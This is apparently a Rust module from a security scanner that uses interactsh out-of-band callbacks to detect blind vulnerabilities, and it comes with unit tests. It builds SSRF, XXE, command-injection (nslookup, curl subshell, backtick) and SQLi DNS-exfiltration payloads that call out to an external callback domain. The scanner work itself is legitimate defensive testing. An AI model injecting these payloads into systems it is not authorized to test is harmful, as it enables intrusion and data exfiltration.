//! Out-of-band (OOB) callback infrastructure for blind vulnerability detection.
//!
//! Wraps the `interactsh-client` CLI as a long-running subprocess to provide
//! OOB callback URLs. Scanner modules inject these URLs into test payloads;
//! when the target application makes a request to the callback URL, the
//! interaction is captured and correlated back to the originating payload.
//!
//! This module provides:
//! - [`InteractshSession`] — manages the `interactsh-client` subprocess lifecycle
//! - [`OobInteraction`] — a received callback interaction
//! - [`BlindPayload`] and [`BlindCategory`] — blind vulnerability payload templates
//! - [`correlate_interactions`] — matches interactions to correlation IDs

use std::fmt;
use std::path::PathBuf;
use std::process::Stdio;
use std::time::Duration;

use serde::{Deserialize, Serialize};
use tokio::io::{AsyncBufRead, AsyncBufReadExt, BufReader};
use tokio::process::ChildStdout;

use super::error::{Result, ScorchError};
use crate::runner::subprocess::{
    resolve_tool_path, spawn_owned_process, stop_owned_process, OwnedProcess,
    DEFAULT_TOOL_OUTPUT_LIMIT_BYTES,
};

/// Default timeout for polling OOB interactions after payload injection.
const DEFAULT_POLL_TIMEOUT: Duration = Duration::from_secs(10);

/// Maximum accepted size of one line from the long-lived client.
const INTERACTSH_LINE_LIMIT_BYTES: usize = 1_048_576;

/// Sentinel used when process infrastructure fails before yielding an exit status.
const TOOL_INFRASTRUCTURE_FAILURE_STATUS: i32 = -1;

/// A received OOB interaction from the Interactsh server.
///
/// Represents a single callback event — a DNS lookup, HTTP request, or other
/// protocol interaction that hit the generated OOB callback URL.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OobInteraction {
    /// Protocol of the interaction (e.g., "dns", "http", "smtp").
    pub protocol: String,

    /// The unique session identifier (base domain without correlation prefix).
    #[serde(rename = "unique-id")]
    pub unique_id: String,

    /// Full interaction identifier including the correlation prefix.
    ///
    /// Format: `{correlation_id}.{unique_id}` — used to match interactions
    /// back to the payload that triggered them.
    #[serde(rename = "full-id")]
    pub full_id: String,

    /// Raw request data from the interaction (protocol-specific).
    #[serde(rename = "raw-request", default)]
    pub raw_request: Option<String>,

    /// Remote address of the interacting host.
    #[serde(rename = "remote-address", default)]
    pub remote_address: Option<String>,

    /// ISO 8601 timestamp of when the interaction occurred.
    #[serde(default)]
    pub timestamp: Option<String>,
}

/// Categories of blind vulnerabilities detectable via OOB callbacks.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "lowercase")]
pub enum BlindCategory {
    /// Blind Server-Side Request Forgery.
    Ssrf,
    /// Blind XML External Entity injection.
    Xxe,
    /// Blind Remote Code Execution (command injection).
    Rce,
    /// Blind SQL Injection (data exfiltration via DNS/HTTP).
    Sqli,
}

impl fmt::Display for BlindCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Ssrf => write!(f, "Blind SSRF"),
            Self::Xxe => write!(f, "Blind XXE"),
            Self::Rce => write!(f, "Blind RCE"),
            Self::Sqli => write!(f, "Blind SQLi"),
        }
    }
}

/// A blind vulnerability test payload with an embedded OOB callback URL.
#[derive(Debug, Clone)]
pub struct BlindPayload {
    /// Unique identifier for correlating callbacks to this payload.
    pub correlation_id: String,
    /// Category of blind vulnerability being tested.
    pub category: BlindCategory,
    /// The rendered payload string ready for injection.
    pub payload: String,
    /// Human-readable description of the test.
    pub description: String,
}

/// Generate a callback URL by prepending a correlation ID to the base domain.
///
/// The resulting URL follows the Interactsh convention where subdomain prefixes
/// are used for correlation: `{correlation_id}.{base_domain}`.
#[must_use]
pub fn callback_url(base_domain: &str, correlation_id: &str) -> String {
    format!("{correlation_id}.{base_domain}")
}

/// Generate blind vulnerability payloads for a given OOB callback domain.
///
/// Produces payloads across all four blind categories (SSRF, XXE, RCE, `SQLi`),
/// each embedding the OOB callback URL for detection. The `param_name` is used
/// to create unique correlation IDs per injection point.
#[must_use]
pub fn generate_blind_payloads(base_domain: &str, param_name: &str) -> Vec<BlindPayload> {
    let mut payloads = Vec::new();

    // Blind SSRF — inject OOB URL into URL-accepting parameters
    let ssrf_id = format!("ssrf-{param_name}");
    let ssrf_url = callback_url(base_domain, &ssrf_id);
    payloads.push(BlindPayload {
        correlation_id: ssrf_id,
        category: BlindCategory::Ssrf,
        payload: format!("http://{ssrf_url}"),
        description: format!("Blind SSRF via parameter '{param_name}'"),
    });

    // Blind XXE — XML entity that fetches the OOB URL
    let xxe_id = format!("xxe-{param_name}");
    let xxe_url = callback_url(base_domain, &xxe_id);
    payloads.push(BlindPayload {
        correlation_id: xxe_id,
        category: BlindCategory::Xxe,
        payload: format!(
            "<?xml version=\"1.0\"?><!DOCTYPE foo [\
             <!ENTITY xxe SYSTEM \"http://{xxe_url}\">]>\
             <root>&xxe;</root>"
        ),
        description: format!("Blind XXE via parameter '{param_name}'"),
    });

    // Blind RCE — command injection payloads that trigger DNS/HTTP callbacks
    for (suffix, cmd_template, desc) in &[
        ("nslookup", "; nslookup {url}", "nslookup command injection"),
        ("curl", "$(curl http://{url})", "curl subshell injection"),
        ("backtick", "`nslookup {url}`", "backtick command injection"),
    ] {
        let rce_id = format!("rce-{param_name}-{suffix}");
        let rce_url = callback_url(base_domain, &rce_id);
        payloads.push(BlindPayload {
            correlation_id: rce_id,
            category: BlindCategory::Rce,
            payload: cmd_template.replace("{url}", &rce_url),
            description: format!("{desc} via parameter '{param_name}'"),
        });
    }

    // Blind SQLi — DNS exfiltration via database functions
    let sqli_id = format!("sqli-{param_name}");
    let sqli_url = callback_url(base_domain, &sqli_id);
    payloads.push(BlindPayload {
        correlation_id: sqli_id,
        category: BlindCategory::Sqli,
        payload: format!("' AND 1=(SELECT LOAD_FILE(CONCAT('\\\\\\\\','{sqli_url}','\\\\a')))-- -"),
        description: format!("Blind SQLi DNS exfiltration via parameter '{param_name}'"),
    });

    payloads
}

/// Extract the correlation ID from an interaction's `full_id`.
///
/// The `full_id` format is `{correlation_id}.{unique_id}`. This function
/// strips the `unique_id` suffix to recover the correlation prefix.
#[must_use]
pub fn extract_correlation_id(full_id: &str, unique_id: &str) -> Option<String> {
    let suffix = format!(".{unique_id}");
    full_id.strip_suffix(&suffix).map(String::from)
}

/// Match interactions against a set of known correlation IDs.
///
/// Returns tuples of `(correlation_id, interaction)` for each interaction
/// whose `full_id` matches one of the provided correlation IDs.
#[must_use]
pub fn correlate_interactions<'a>(
    interactions: &'a [OobInteraction],
    correlation_ids: &[String],
) -> Vec<(String, &'a OobInteraction)> {
    interactions
        .iter()
        .filter_map(|interaction| {
            let corr_id = extract_correlation_id(&interaction.full_id, &interaction.unique_id)?;
            if correlation_ids.contains(&corr_id) {
                Some((corr_id, interaction))
            } else {
                None
            }
        })
        .collect()
}

/// Manages an `interactsh-client` subprocess session.
///
/// Handles the full lifecycle: starting the client, extracting the base URL,
/// collecting interactions, and stopping the process. Unlike one-shot tool
/// wrappers that use the shared bounded executor, this maintains a persistent
/// subprocess because `interactsh-client` keeps an
/// ephemeral session alive for receiving callbacks.
pub struct InteractshSession {
    /// Requested executable name or path, retained for typed errors.
    program: String,
    /// Canonical executable selected for the session.
    resolved_program: PathBuf,
    /// The base callback domain (e.g., `abc123.oast.fun`).
    base_url: String,
    /// Handle and platform owner for the running `interactsh-client` process tree.
    child: OwnedProcess,
    /// Persistent reader for interaction lines produced after startup.
    stdout: BufReader<ChildStdout>,
    /// Total stdout bytes consumed across startup and polling.
    output_bytes: usize,
}

impl fmt::Debug for InteractshSession {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.debug_struct("InteractshSession")
            .field("program", &self.program)
            .field("base_url", &self.base_url)
            .field("resolved_program", &self.resolved_program)
            .field("process_group", &"<owned>")
            .field("child", &"<running>")
            .field("stdout", &"<piped>")
            .field("output_bytes", &self.output_bytes)
            .finish()
    }
}

impl InteractshSession {
    /// Start a session with an explicit client program.
    ///
    /// This is used by the tool adapter and its local lifecycle contract so
    /// executable selection remains observable without mutating global `PATH`.
    pub(crate) async fn start_with_arguments(program: &str, arguments: &[String]) -> Result<Self> {
        let resolved_program = resolve_tool_path(program)?;
        let mut command = tokio::process::Command::new(&resolved_program);
        command.args(arguments);
        Self::start_with_command(program, resolved_program, command).await
    }

    async fn start_with_command(
        program: &str,
        resolved_program: PathBuf,
        mut command: tokio::process::Command,
    ) -> Result<Self> {
        command
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .kill_on_drop(true);
        let mut child = spawn_owned_process(command).map_err(|e| ScorchError::ToolFailed {
            tool: program.to_string(),
            status: TOOL_INFRASTRUCTURE_FAILURE_STATUS,
            stderr: e.to_string(),
        })?;

        let stdout = child.take_stdout().ok_or_else(|| ScorchError::ToolOutputParse {
            tool: program.to_string(),
            reason: "failed to capture stdout".to_string(),
        })?;

        let mut reader = tokio::io::BufReader::new(stdout);
        let mut base_url = String::new();
        let mut output_bytes = 0usize;

        // Read lines until we find the base URL (contains .oast. or similar pattern)
        let startup_timeout = Duration::from_secs(30);
        let deadline = tokio::time::Instant::now() + startup_timeout;

        loop {
            let remaining = DEFAULT_TOOL_OUTPUT_LIMIT_BYTES.saturating_sub(output_bytes);
            let line_limit = remaining.min(INTERACTSH_LINE_LIMIT_BYTES);
            let read_result =
                tokio::time::timeout_at(deadline, read_bounded_line(&mut reader, line_limit)).await;

            match read_result {
                Ok(Ok(None)) => {
                    // EOF — process exited
                    break;
                }
                Ok(Ok(Some((line, bytes_read)))) => {
                    output_bytes += bytes_read;
                    let trimmed = line.trim().to_string();

                    // Look for the base URL in the output
                    if let Some(url) = extract_base_url(&trimmed) {
                        base_url = url;
                        break;
                    }
                }
                Ok(Err(e)) => {
                    let _ = stop_owned_process(&mut child).await;
                    return Err(output_read_error(program, &e));
                }
                Err(_) => {
                    let _ = stop_owned_process(&mut child).await;
                    return Err(ScorchError::Cancelled {
                        reason: "interactsh-client did not produce a base URL within 30s"
                            .to_string(),
                    });
                }
            }
        }

        if base_url.is_empty() {
            let _ = stop_owned_process(&mut child).await;
            return Err(ScorchError::ToolOutputParse {
                tool: program.to_string(),
                reason: "could not extract base URL from output".to_string(),
            });
        }

        Ok(Self {
            program: program.to_string(),
            resolved_program,
            base_url,
            child,
            stdout: reader,
            output_bytes,
        })
    }

    /// The base callback domain for this session.
    #[must_use]
    pub fn base_url(&self) -> &str {
        &self.base_url
    }

    /// Canonical executable selected for this session.
    #[must_use]
    pub fn resolved_program(&self) -> &std::path::Path {
        &self.resolved_program
    }

    /// Generate a callback URL with the given correlation ID.
    #[must_use]
    pub fn callback_url(&self, correlation_id: &str) -> String {
        callback_url(&self.base_url, correlation_id)
    }

    /// Poll for interactions by waiting for the specified duration then
    /// reading any accumulated JSON lines from stdout.
    ///
    /// # Errors
    ///
    /// Returns an error if reading from the subprocess stdout fails.
    pub async fn poll(&mut self, timeout: Duration) -> Result<Vec<OobInteraction>> {
        let deadline = tokio::time::Instant::now() + timeout;
        let mut interactions = Vec::new();
        loop {
            let remaining = DEFAULT_TOOL_OUTPUT_LIMIT_BYTES.saturating_sub(self.output_bytes);
            let line_limit = remaining.min(INTERACTSH_LINE_LIMIT_BYTES);

            match tokio::time::timeout_at(deadline, read_bounded_line(&mut self.stdout, line_limit))
                .await
            {
                Err(_) | Ok(Ok(None)) => break,
                Ok(Ok(Some((line, bytes_read)))) => {
                    self.output_bytes += bytes_read;
                    if let Ok(interaction) = serde_json::from_str::<OobInteraction>(line.trim()) {
                        interactions.push(interaction);
                    }
                }
                Ok(Err(error)) => {
                    return Err(output_read_error(&self.program, &error));
                }
            }
        }
        Ok(interactions)
    }

    /// Poll with the default timeout.
    ///
    /// # Errors
    ///
    /// Returns an error if reading from the subprocess stdout fails.
    pub async fn poll_default(&mut self) -> Result<Vec<OobInteraction>> {
        self.poll(DEFAULT_POLL_TIMEOUT).await
    }

    /// Stop the session and kill the subprocess.
    ///
    /// # Errors
    ///
    /// Returns an error if the subprocess cannot be terminated.
    pub async fn stop(&mut self) -> Result<()> {
        stop_owned_process(&mut self.child).await.map_err(|error| ScorchError::ToolFailed {
            tool: self.program.clone(),
            status: TOOL_INFRASTRUCTURE_FAILURE_STATUS,
            stderr: error.to_string(),
        })
    }
}

fn output_limit_error(tool: &str) -> ScorchError {
    ScorchError::ToolOutputLimit {
        tool: tool.to_string(),
        stream: "stdout",
        limit_bytes: DEFAULT_TOOL_OUTPUT_LIMIT_BYTES,
    }
}

fn output_read_error(tool: &str, error: &std::io::Error) -> ScorchError {
    if error.kind() == std::io::ErrorKind::InvalidData {
        output_limit_error(tool)
    } else {
        ScorchError::ToolFailed {
            tool: tool.to_string(),
            status: TOOL_INFRASTRUCTURE_FAILURE_STATUS,
            stderr: error.to_string(),
        }
    }
}

async fn read_bounded_line<R>(
    reader: &mut R,
    limit_bytes: usize,
) -> std::io::Result<Option<(String, usize)>>
where
    R: AsyncBufRead + Unpin,
{
    let mut bytes = Vec::with_capacity(limit_bytes.min(8 * 1024));
    loop {
        let available = reader.fill_buf().await?;
        if available.is_empty() {
            return if bytes.is_empty() {
                Ok(None)
            } else {
                let byte_count = bytes.len();
                Ok(Some((String::from_utf8_lossy(&bytes).into_owned(), byte_count)))
            };
        }

        let newline = available.iter().position(|byte| *byte == b'\n');
        let consumed = newline.map_or(available.len(), |index| index + 1);
        if bytes.len().saturating_add(consumed) > limit_bytes {
            return Err(std::io::Error::new(
                std::io::ErrorKind::InvalidData,
                "interactsh output line exceeded the configured limit",
            ));
        }
        bytes.extend_from_slice(&available[..consumed]);
        reader.consume(consumed);

        if newline.is_some() {
            let byte_count = bytes.len();
            return Ok(Some((String::from_utf8_lossy(&bytes).into_owned(), byte_count)));
        }
    }
}

/// Extract the base OOB URL from an interactsh-client output line.
///
/// Looks for patterns like `abc123.oast.fun`, `abc123.oast.pro`,
/// `abc123.oast.live`, or `abc123.interact.sh` in log lines.
fn extract_base_url(line: &str) -> Option<String> {
    let oob_patterns = [".oast.fun", ".oast.pro", ".oast.live", ".oast.me", ".interact.sh"];

    line.split(|character: char| {
        !character.is_ascii_alphanumeric() && character != '.' && character != '-'
    })
    .find(|candidate| is_interactsh_domain(candidate, &oob_patterns))
    .map(str::to_string)
}

fn is_interactsh_domain(candidate: &str, suffixes: &[&str]) -> bool {
    suffixes.iter().any(|suffix| {
        candidate.strip_suffix(suffix).is_some_and(|prefix| {
            !prefix.is_empty() && prefix.split('.').all(is_valid_domain_label)
        })
    })
}

fn is_valid_domain_label(label: &str) -> bool {
    !label.is_empty()
        && !label.starts_with('-')
        && !label.ends_with('-')
        && label.chars().all(|character| character.is_ascii_alphanumeric() || character == '-')
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    static SESSION_TEST_LOCK: tokio::sync::Mutex<()> = tokio::sync::Mutex::const_new(());
    #[cfg(unix)]
    const SESSION_STARTUP_LINE: &str = "[INF] session123.oast.fun";
    #[cfg(unix)]
    const SESSION_INTERACTION_LINE: &str =
        r#"{"protocol":"dns","unique-id":"session123","full-id":"ssrf-url.session123"}"#;

    #[cfg(windows)]
    const WINDOWS_OOB_FIXTURE_TEST: &str = "engine::oob::tests::windows_oob_process_fixture";
    #[cfg(windows)]
    const WINDOWS_OOB_FIXTURE_MODE: &str = "SCORCHKIT_WINDOWS_OOB_FIXTURE_MODE";
    #[cfg(windows)]
    const WINDOWS_OOB_FIXTURE_PID: &str = "SCORCHKIT_WINDOWS_OOB_FIXTURE_PID";

    #[cfg(unix)]
    async fn start_shell_fixture(script: &Path) -> Result<InteractshSession> {
        let arguments = vec![script.to_string_lossy().into_owned()];
        InteractshSession::start_with_arguments("/bin/sh", &arguments).await
    }

    #[cfg(windows)]
    #[test]
    fn windows_oob_process_fixture() {
        use std::io::Write as _;

        let Ok(mode) = std::env::var(WINDOWS_OOB_FIXTURE_MODE) else {
            return;
        };
        if mode == "descendant" {
            std::thread::sleep(Duration::from_mins(1));
            return;
        }

        assert_eq!(mode, "leader");
        let pid_path = std::env::var_os(WINDOWS_OOB_FIXTURE_PID)
            .map(PathBuf::from)
            .expect("OOB descendant PID fixture path");
        let executable = std::env::current_exe().expect("current OOB fixture executable");
        let mut descendant = std::process::Command::new(executable)
            .args(["--exact", WINDOWS_OOB_FIXTURE_TEST, "--nocapture"])
            .env(WINDOWS_OOB_FIXTURE_MODE, "descendant")
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::null())
            .spawn()
            .expect("spawn OOB descendant fixture");
        let descendant_pid = descendant.id();
        std::thread::spawn(move || {
            let _ = descendant.wait();
        });
        std::fs::write(pid_path, descendant_pid.to_string()).expect("write OOB descendant PID");

        let mut stdout = std::io::stdout().lock();
        writeln!(stdout, "[INF] windows123.oast.fun").expect("write OOB startup line");
        stdout.flush().expect("flush OOB startup line");
        std::thread::sleep(Duration::from_mins(1));
    }

    #[cfg(windows)]
    async fn start_windows_oob_fixture(pid_file: &Path) -> Result<InteractshSession> {
        let executable = std::env::current_exe().expect("current OOB fixture executable");
        let mut command = tokio::process::Command::new(&executable);
        command
            .args(["--exact", WINDOWS_OOB_FIXTURE_TEST, "--nocapture"])
            .env(WINDOWS_OOB_FIXTURE_MODE, "leader")
            .env(WINDOWS_OOB_FIXTURE_PID, pid_file);
        InteractshSession::start_with_command("windows-oob-fixture", executable, command).await
    }

    // Test suite for OOB callback infrastructure.
    //
    // Validates interaction parsing, URL generation, correlation matching,
    // and blind payload generation without requiring a live interactsh server.

    #[test]
    fn oob_process_limits_and_failure_status_are_stable() {
        assert_eq!(DEFAULT_POLL_TIMEOUT, Duration::from_secs(10));
        assert_eq!(INTERACTSH_LINE_LIMIT_BYTES, 1_048_576);
        assert_eq!(TOOL_INFRASTRUCTURE_FAILURE_STATUS, -1);
    }

    /// Verify `OobInteraction` deserializes from interactsh JSON format.
    ///
    /// Interactsh uses kebab-case field names (`unique-id`, `full-id`, etc.)
    /// which must be handled via `#[serde(rename)]`.
    #[test]
    fn test_interaction_deserialize() -> serde_json::Result<()> {
        let json = r#"{
            "protocol": "dns",
            "unique-id": "abc123def456",
            "full-id": "ssrf-url.abc123def456",
            "raw-request": "DNS A query for ssrf-url.abc123def456.oast.fun",
            "remote-address": "1.2.3.4",
            "timestamp": "2026-03-29T12:00:00Z"
        }"#;

        let interaction: OobInteraction = serde_json::from_str(json)?;

        assert_eq!(interaction.protocol, "dns");
        assert_eq!(interaction.unique_id, "abc123def456");
        assert_eq!(interaction.full_id, "ssrf-url.abc123def456");
        assert_eq!(
            interaction.raw_request.as_deref(),
            Some("DNS A query for ssrf-url.abc123def456.oast.fun")
        );
        assert_eq!(interaction.remote_address.as_deref(), Some("1.2.3.4"));
        assert_eq!(interaction.timestamp.as_deref(), Some("2026-03-29T12:00:00Z"));

        Ok(())
    }

    /// Verify deserialization handles missing optional fields gracefully.
    ///
    /// Interactsh may omit `raw-request`, `remote-address`, and `timestamp`
    /// in certain interaction types.
    #[test]
    fn test_interaction_deserialize_minimal() -> serde_json::Result<()> {
        let json = r#"{
            "protocol": "http",
            "unique-id": "xyz789",
            "full-id": "rce-cmd.xyz789"
        }"#;

        let interaction: OobInteraction = serde_json::from_str(json)?;

        assert_eq!(interaction.protocol, "http");
        assert_eq!(interaction.unique_id, "xyz789");
        assert_eq!(interaction.full_id, "rce-cmd.xyz789");
        assert!(interaction.raw_request.is_none());
        assert!(interaction.remote_address.is_none());
        assert!(interaction.timestamp.is_none());

        Ok(())
    }

    /// Verify callback URL generation follows the `{id}.{base}` convention.
    #[test]
    fn test_callback_url_generation() {
        let url = callback_url("abc123.oast.fun", "ssrf-url");
        assert_eq!(url, "ssrf-url.abc123.oast.fun");

        let url = callback_url("xyz.interact.sh", "rce-cmd-nslookup");
        assert_eq!(url, "rce-cmd-nslookup.xyz.interact.sh");
    }

    /// Verify correlation ID extraction from full interaction IDs.
    ///
    /// The `full_id` is `{correlation_id}.{unique_id}`. Stripping the `unique_id`
    /// suffix recovers the correlation prefix.
    #[test]
    fn test_correlation_id_extraction() {
        assert_eq!(
            extract_correlation_id("ssrf-url.abc123", "abc123"),
            Some("ssrf-url".to_string())
        );

        assert_eq!(
            extract_correlation_id("rce-cmd-nslookup.xyz789", "xyz789"),
            Some("rce-cmd-nslookup".to_string())
        );

        // No match when unique_id doesn't appear as suffix
        assert_eq!(extract_correlation_id("nomatch", "abc123"), None);
    }

    /// Verify interaction-to-correlation matching filters correctly.
    ///
    /// Only interactions whose extracted correlation ID matches a known ID
    /// from the payload set should be returned.
    #[test]
    fn test_correlation_matching() {
        let interactions = vec![
            OobInteraction {
                protocol: "dns".to_string(),
                unique_id: "abc123".to_string(),
                full_id: "ssrf-url.abc123".to_string(),
                raw_request: None,
                remote_address: None,
                timestamp: None,
            },
            OobInteraction {
                protocol: "http".to_string(),
                unique_id: "abc123".to_string(),
                full_id: "unknown-prefix.abc123".to_string(),
                raw_request: None,
                remote_address: None,
                timestamp: None,
            },
            OobInteraction {
                protocol: "dns".to_string(),
                unique_id: "abc123".to_string(),
                full_id: "rce-cmd-nslookup.abc123".to_string(),
                raw_request: None,
                remote_address: None,
                timestamp: None,
            },
        ];

        let known_ids =
            vec!["ssrf-url".to_string(), "rce-cmd-nslookup".to_string(), "xxe".to_string()];

        let matched = correlate_interactions(&interactions, &known_ids);

        assert_eq!(matched.len(), 2);
        assert_eq!(matched[0].0, "ssrf-url");
        assert_eq!(matched[0].1.protocol, "dns");
        assert_eq!(matched[1].0, "rce-cmd-nslookup");
        assert_eq!(matched[1].1.protocol, "dns");
    }

    /// Verify blind payload generation produces all 4 categories.
    ///
    /// Each call should produce: 1 SSRF, 1 XXE, 3 RCE (nslookup, curl, backtick),
    /// 1 `SQLi` = 6 payloads total.
    #[test]
    fn test_blind_payloads_contain_oob_url() {
        let payloads = generate_blind_payloads("abc123.oast.fun", "url");

        assert_eq!(payloads.len(), 6);

        // All payloads should embed the OOB domain
        for payload in &payloads {
            assert!(
                payload.payload.contains("abc123.oast.fun"),
                "Payload for {:?} missing OOB URL: {}",
                payload.category,
                payload.payload
            );
        }

        // Check category distribution
        let ssrf_count = payloads.iter().filter(|p| p.category == BlindCategory::Ssrf).count();
        let xxe_count = payloads.iter().filter(|p| p.category == BlindCategory::Xxe).count();
        let rce_count = payloads.iter().filter(|p| p.category == BlindCategory::Rce).count();
        let sqli_count = payloads.iter().filter(|p| p.category == BlindCategory::Sqli).count();

        assert_eq!(ssrf_count, 1);
        assert_eq!(xxe_count, 1);
        assert_eq!(rce_count, 3);
        assert_eq!(sqli_count, 1);
    }

    /// Verify each `BlindCategory` variant has a human-readable display string.
    #[test]
    fn test_blind_category_display() {
        assert_eq!(BlindCategory::Ssrf.to_string(), "Blind SSRF");
        assert_eq!(BlindCategory::Xxe.to_string(), "Blind XXE");
        assert_eq!(BlindCategory::Rce.to_string(), "Blind RCE");
        assert_eq!(BlindCategory::Sqli.to_string(), "Blind SQLi");
    }

    /// Verify `BlindCategory` serializes to lowercase per serde config.
    #[test]
    fn test_blind_category_serde() -> serde_json::Result<()> {
        let json = serde_json::to_string(&BlindCategory::Ssrf)?;
        assert_eq!(json, "\"ssrf\"");

        let parsed: BlindCategory = serde_json::from_str("\"xxe\"")?;
        assert_eq!(parsed, BlindCategory::Xxe);

        Ok(())
    }

    /// Verify base URL extraction from interactsh-client output lines.
    ///
    /// The client prints log lines like `[INF] abc123.oast.fun` during startup.
    #[test]
    fn test_extract_base_url() {
        assert_eq!(
            extract_base_url("[INF] abc123def456.oast.fun"),
            Some("abc123def456.oast.fun".to_string())
        );

        assert_eq!(extract_base_url("[INF] Listing 1 payload for OOB Testing"), None,);

        assert_eq!(extract_base_url("xyz789.interact.sh"), Some("xyz789.interact.sh".to_string()));

        assert_eq!(
            extract_base_url("[INF] session123.oast.pro"),
            Some("session123.oast.pro".to_string())
        );

        assert_eq!(
            extract_base_url("callback=(punctuated-123.oast.live),"),
            Some("punctuated-123.oast.live".to_string())
        );

        // No OOB domain present
        assert_eq!(extract_base_url("some random log line"), None);
        assert_eq!(extract_base_url("visit example.com for details"), None);
        assert_eq!(extract_base_url(".oast.fun"), None);
        assert_eq!(extract_base_url("-invalid.oast.fun"), None);
        assert_eq!(extract_base_url("invalid-.oast.fun"), None);
        assert_eq!(extract_base_url("invalid..label.oast.fun"), None);
    }

    /// Verify correlation IDs are unique per parameter name.
    ///
    /// Different parameter names should produce different correlation IDs
    /// to distinguish which injection point triggered the callback.
    #[test]
    fn test_payloads_unique_correlation_ids() {
        let payloads_url = generate_blind_payloads("abc.oast.fun", "url");
        let payloads_src = generate_blind_payloads("abc.oast.fun", "src");

        let ids_url: Vec<&str> = payloads_url.iter().map(|p| p.correlation_id.as_str()).collect();
        let ids_src: Vec<&str> = payloads_src.iter().map(|p| p.correlation_id.as_str()).collect();

        // No overlap between different parameter payloads
        for id in &ids_url {
            assert!(
                !ids_src.contains(id),
                "Correlation ID collision: {id} appears in both url and src payloads"
            );
        }
    }

    #[tokio::test]
    async fn bounded_line_reader_rejects_oversized_lines() {
        let mut reader = BufReader::new(&b"12345\n"[..]);
        let error = read_bounded_line(&mut reader, 4)
            .await
            .expect_err("line must exceed the four-byte limit");
        assert_eq!(error.kind(), std::io::ErrorKind::InvalidData);
    }

    #[tokio::test]
    async fn bounded_line_reader_accepts_the_exact_limit() {
        let mut reader = BufReader::new(&b"123\n"[..]);
        let line = read_bounded_line(&mut reader, 4)
            .await
            .expect("exact-limit line should be readable")
            .expect("fixture should contain one line");
        assert_eq!(line, ("123\n".to_string(), 4));
    }

    #[test]
    fn output_read_errors_distinguish_limits_from_infrastructure() {
        let limit = std::io::Error::new(std::io::ErrorKind::InvalidData, "too large");
        assert!(matches!(
            output_read_error("fixture", &limit),
            ScorchError::ToolOutputLimit {
                tool,
                stream: "stdout",
                limit_bytes: DEFAULT_TOOL_OUTPUT_LIMIT_BYTES,
            } if tool == "fixture"
        ));

        let infrastructure = std::io::Error::new(std::io::ErrorKind::BrokenPipe, "pipe closed");
        assert!(matches!(
            output_read_error("fixture", &infrastructure),
            ScorchError::ToolFailed {
                tool,
                status: TOOL_INFRASTRUCTURE_FAILURE_STATUS,
                stderr,
            } if tool == "fixture" && stderr == "pipe closed"
        ));
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn session_reads_interactions_produced_after_startup() {
        let _session_guard = SESSION_TEST_LOCK.lock().await;
        let directory = tempfile::tempdir().expect("temporary directory");
        let script = directory.path().join("interactsh-fixture");
        std::fs::write(
            &script,
            format!(
                r"#!/bin/sh
printf '%s\n' '{SESSION_STARTUP_LINE}'
sleep 0.02
printf '%s\n' '{SESSION_INTERACTION_LINE}'
"
            ),
        )
        .expect("write fixture client");

        let mut session = start_shell_fixture(&script).await.expect("start fixture session");
        assert_eq!(session.base_url(), "session123.oast.fun");
        assert_eq!(
            session.resolved_program(),
            Path::new("/bin/sh").canonicalize().expect("canonical shell")
        );
        assert_eq!(session.callback_url("ssrf-url"), "ssrf-url.session123.oast.fun");
        assert_eq!(session.output_bytes, SESSION_STARTUP_LINE.len() + 1);

        let debug = format!("{session:?}");
        assert!(debug.starts_with("InteractshSession {"));
        assert!(debug.contains("base_url: \"session123.oast.fun\""));
        assert!(debug.contains("child: \"<running>\""));
        assert!(debug.contains("stdout: \"<piped>\""));
        assert!(!debug.contains("Child {"));

        let interactions = session.poll_default().await.expect("poll fixture interactions");
        assert_eq!(interactions.len(), 1);
        assert_eq!(interactions[0].protocol, "dns");
        assert_eq!(interactions[0].full_id, "ssrf-url.session123");
        assert_eq!(
            session.output_bytes,
            SESSION_STARTUP_LINE.len() + SESSION_INTERACTION_LINE.len() + 2
        );
        session.stop().await.expect("stop fixture session");
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn stop_terminates_and_reaps_a_running_client() {
        let _session_guard = SESSION_TEST_LOCK.lock().await;
        let directory = tempfile::tempdir().expect("temporary directory");
        let script = directory.path().join("interactsh-running-fixture");
        std::fs::write(
            &script,
            r"#!/bin/sh
printf '%s\n' '[INF] running123.oast.fun'
sleep 60
",
        )
        .expect("write running fixture client");

        let mut session =
            start_shell_fixture(&script).await.expect("start running fixture session");
        assert!(session.child.try_wait().expect("inspect running client").is_none());

        session.stop().await.expect("stop running fixture session");
        assert!(session.child.try_wait().expect("inspect stopped client").is_some());
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn stop_terminates_interactsh_descendants() {
        let _session_guard = SESSION_TEST_LOCK.lock().await;
        let directory = tempfile::tempdir().expect("temporary directory");
        let pid_file = directory.path().join("stop-descendant.pid");
        let script = write_descendant_fixture(directory.path(), &pid_file);

        let mut session = start_shell_fixture(&script).await.expect("start descendant fixture");
        let descendant = wait_for_fixture_pid(&pid_file).await;
        session.stop().await.expect("stop descendant fixture");

        assert_process_exits(descendant).await;
    }

    #[cfg(unix)]
    #[tokio::test]
    async fn dropping_session_terminates_interactsh_descendants() {
        let _session_guard = SESSION_TEST_LOCK.lock().await;
        let directory = tempfile::tempdir().expect("temporary directory");
        let pid_file = directory.path().join("drop-descendant.pid");
        let script = write_descendant_fixture(directory.path(), &pid_file);

        let session = start_shell_fixture(&script).await.expect("start descendant fixture");
        let descendant = wait_for_fixture_pid(&pid_file).await;
        drop(session);

        assert_process_exits(descendant).await;
    }

    #[cfg(windows)]
    #[tokio::test]
    async fn windows_stop_terminates_interactsh_descendants() {
        let _session_guard = SESSION_TEST_LOCK.lock().await;
        let directory = tempfile::tempdir().expect("temporary directory");
        let pid_file = directory.path().join("windows-stop-descendant.pid");

        let mut session = start_windows_oob_fixture(&pid_file)
            .await
            .expect("start Windows OOB descendant fixture");
        assert_eq!(session.base_url(), "windows123.oast.fun");
        let descendant = wait_for_windows_oob_fixture_pid(&pid_file).await;
        session.stop().await.expect("stop Windows OOB descendant fixture");

        assert_windows_oob_process_exits(descendant).await;
